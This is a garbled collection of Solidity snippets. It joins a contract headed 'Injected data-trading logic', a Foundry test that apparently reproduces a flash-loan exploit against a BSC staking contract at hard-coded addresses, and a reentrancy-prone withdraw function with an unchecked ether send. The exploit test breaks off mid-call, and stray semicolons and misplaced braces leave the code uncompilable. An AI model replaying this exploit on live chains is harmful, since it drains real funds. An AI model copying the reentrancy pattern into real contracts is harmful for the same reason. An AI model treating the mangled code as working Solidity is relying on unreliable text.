
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.10;

;
;
interface IStakingRewards {
    function stake(address token, address token1, address token2, address up, uint256 amount) external;
    function claim(address token, address token1) external};
contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    IERC20 QIQI = IERC20(0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d);
    Uni_Pair_V3 Pair = Uni_Pair_V3(0x4B1aC1E4B828EBC81FcaC587BEf64e4aDd1dBCEc);
    Uni_Router_V2 Router = Uni_Router_V2(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);
    IUniswapV2Factory Factory = IUniswapV2Factory(0x2c37655f8D942f2411d9d85a5FE580C156305070);
    IStakingRewards StakingRewards = IStakingRewards(0xeaF83465025b4Bf9020fdF9ea5fB6e71dC8a0779);
    TOKENA TokenA;
    Exploiter exploiter;
    Uni_Pair_V2 pair;
    address[] expoiterList;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 28_187_317);
        cheats.label(address(USDT), "USDT");
        cheats.label(address(QIQI), "QIQI");
        cheats.label(address(SELLC), "SELLC");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(Router), "Router");
        cheats.label(address(Factory), "Factory");
        cheats.label(address(StakingRewards), "StakingRewards")};
    function testExploit() public {
        deal(address(USDT), address(this), 1000 * 1e18);
        stakeFactory(10);
        cheats.warp(block.timestamp + 60 * 60);
        TokenA = new TOKENA();
        TokenA.mint(100);
        Pair.flash(address(this), 10_000 * 1e18, 0, new bytes(1));
        emit log_named_decimal_uint("Attacker QIQI balance after exploit", QIQI.balanceOf(address(this
mapping(address => uint256) public balances;
function withdraw() public {
    if (balances[msg.sender] > 0) {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent);
        balances[msg.sender] = 0}
function unsafeSend(address to) public {
    to.call{value: 1 ether}("")}